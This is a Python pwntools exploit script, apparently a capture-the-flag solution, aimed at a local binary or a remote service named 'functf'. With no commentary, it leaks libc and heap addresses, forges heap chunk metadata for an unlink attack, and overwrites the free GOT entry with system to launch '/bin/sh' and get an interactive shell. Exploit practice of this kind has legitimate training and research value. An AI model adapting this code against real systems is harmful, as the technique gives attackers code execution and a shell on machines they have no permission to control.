from pwn import *

if len(sys.argv)==1:
    p=process("linux_server64")
elif sys.argv[1]=="1":
    p=process("./bin")
    os.system("echo "+str(p.pid)+" > pid")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
    os.system("echo "+str(p.pid)+" > pid")
    pause()
elif sys.argv[1]=="3":
    p=remote("functf",18018)

def cal(idx):
    log.info("cal : "+str(idx))
    p.sendlineafter(">","1")
    p.sendlineafter("?",str(idx))

def read(idx,payload,yn="y"):
    log.info("read : "+str(idx))
    p.sendlineafter(">","2")
    p.sendlineafter("?",str(idx))
    sleep(0.5)
    if yn=="y":
        payload+="\x00"*(0x1000-len(payload))
        p.send(payload)
    else:
        p.sendline(payload)

def puts(idx):
    log.info("puts : "+str(idx))
    p.sendlineafter(">","3")
    p.sendlineafter("?",str(idx))
    sleep(0.5)
    buf=p.recvuntil("puts OK\n")
    print hexdump(buf)
    buf=p.recvuntil("\n==")
    print hexdump(buf)
    return buf

def free(idx):
    log.info("free : "+str(idx))
    p.sendlineafter(">","4")
    p.sendlineafter("?",str(idx))

cal(0)
cal(1)
cal(2)
cal(3)
cal(4)
cal(5)
cal(6)
cal(7)

payload=""
payload+="A"*0x40
read(0,payload)

puts(0)

free(1)
free(3)

buf=puts(1)
libc1=u64(buf[:-3].ljust(8,'\x00'))
buf=puts(3)
heap1=u64(buf[:-3].ljust(8,'\x00'))
libc_base = libc1 - 0x3dac78
print 'libc1:',hex(libc1)
print 'heap1:',hex(heap1)
pause()

target_bss = 0x6020f0

payload=""
payload+=p64(0)
payload+=p64(0x1010-0x10)
payload+=p64(target_bss-0x18)
payload+=p64(target_bss-0x10)
payload+="\x00"*0xfa0
payload+="/"
read(6,payload)
payload=""
payload+="FSRD"
payload+="ROOT"
payload+="/"
payload+="B"*0x30
payload+="C"*(0x30-0x21)
payload+=p64(0x1010-0x10)
payload+=p64(0x1010)
payload+="D"*0x8
payload+="E"*0x8
read(7,payload)

free(7)

free_got=0x602018
payload=p64(free_got)
read(6,payload,'n')

libc_elf=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_system = libc_base + libc_elf.sym["system"]

payload=p64(libc_system)
read(3,payload,'n')

payload="/bin/sh"
read(4,payload,'n')

free(4)

p.interactive()
